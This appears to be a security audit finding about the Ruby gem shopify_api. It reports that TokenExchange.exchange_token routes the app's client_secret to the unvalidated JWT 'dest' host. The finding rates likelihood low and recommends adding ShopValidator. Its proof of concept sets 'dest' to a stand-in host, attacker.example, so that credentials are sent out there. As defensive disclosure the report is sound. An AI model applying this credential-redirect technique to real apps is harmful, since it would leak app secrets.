### Title
`dest` claim of session token used unbound to `ShopValidator`, sending `client_secret` to an unvalidated host in `TokenExchange.exchange_token` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the network destination for the token-exchange request directly from the `dest` claim of the caller-supplied session token (JWT), without ever passing it through `Utils::ShopValidator`, the allowlist check that every sibling credential-exchange method in this gem uses for the same purpose.

### Finding Description
`JwtPayload#shop` returns the raw `dest` claim with only the literal string `"https://"` stripped off, with no format or domain validation: [1](#0-0) 

`JwtPayload#initialize` only verifies the JWT signature and the `aud` claim; it never checks that `iss`/`dest` belong to a trusted Shopify domain: [2](#0-1) 

`TokenExchange.exchange_token` takes that unchecked value as `dest_shop` and uses it verbatim to build the `Session` that determines the request host, sending it alongside the app's `client_secret` and the raw `subject_token`: [3](#0-2) 

`Clients::HttpClient#initialize` builds the outbound request URI straight from `session.shop`: [4](#0-3) 

This is inconsistent with the rest of the gem. Every other credential-exchange path binds the shop value to `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS` before using it as a network destination:
- `ClientCredentials.client_credentials` calls `Utils::ShopValidator.sanitize!(shop)` before building the session used by `HttpClient`. [5](#0-4) 
- `TokenExchange.migrate_to_expiring_token` (same file) also calls `Utils::ShopValidator.sanitize!(shop)`. [6](#0-5) 

`ShopValidator` exists precisely to bind an untrusted "shop" string to a known-good Shopify domain before it is trusted as a request destination: [7](#0-6) 

The broken identity binding, expressed as an equality that should hold but doesn't: `network_destination_host == ShopValidator.sanitize!(dest_shop)`, whereas in `exchange_token` it is actually `network_destination_host == jwt_payload.shop` (unsanitized). The JWT's `dest` claim is a claim from the app's own perspective — the gem trusts it as a hostname to route the app's `client_secret` and `subject_token` to, without binding it to the trusted-domain allowlist used everywhere else in the same file for the same purpose.

### Impact Explanation
If `dest` is ever not a legitimate `*.myshopify.com`/trusted domain (host application misconfiguration, non-standard session-token issuer, or any future relaxation of Shopify's token issuance), the gem will POST the app's `client_id`, `client_secret`, and the raw session token to whatever host the `dest` claim names. That is SSRF carrying the app's credentials and exfiltration of the `client_secret` to an unvalidated host — matching the "SSRF with the app's credentials" / "credential leakage" High-impact categories.

### Likelihood Explanation
Exploitation is gated by the JWT signature check in `JwtPayload#decode_token`, which requires the token to be signed with the app's own `api_secret_key` — normally only Shopify's platform can produce such a token for a real installed shop, and Shopify's issuance is expected to always set `dest` to a trusted domain. I could not verify, from this codebase alone, any path by which the `dest` value could be attacker-influenced to point outside the trusted domain set; that would depend on Shopify's own token-issuance guarantees, which are outside this gem. I flag this as likelihood: low-to-uncertain — the missing binding is a genuine, verifiable code defect and inconsistency (compared to `ClientCredentials`/`migrate_to_expiring_token` in the very same file), but I cannot fully confirm attacker-controllability of `dest` from within this repository's code alone.

### Recommendation
In `TokenExchange.exchange_token`, validate `dest_shop` with `Utils::ShopValidator.sanitize!` (or `sanitize_shop_domain`) before constructing `shop_session`/`HttpClient`, exactly as `ClientCredentials.client_credentials` and `TokenExchange.migrate_to_expiring_token` already do, so the request destination is always bound to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Obtain (or, if issuance guarantees are ever weakened, otherwise craft) a session token whose `dest` claim is `https://attacker.example` while still being signed by the app's `api_secret_key`.
2. Call:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
3. `dest_shop` becomes `"attacker.example"`; `Clients::HttpClient` builds `@base_uri = "https://attacker.example"`, and the POST to `/admin/oauth/access_token` sends `client_id`, `client_secret`, and `subject_token` (the raw session token) to `attacker.example`, unlike the equivalent `client_credentials`/`migrate_to_expiring_token` flows, which would reject a non-trusted `shop` via `ShopValidator.sanitize!`.
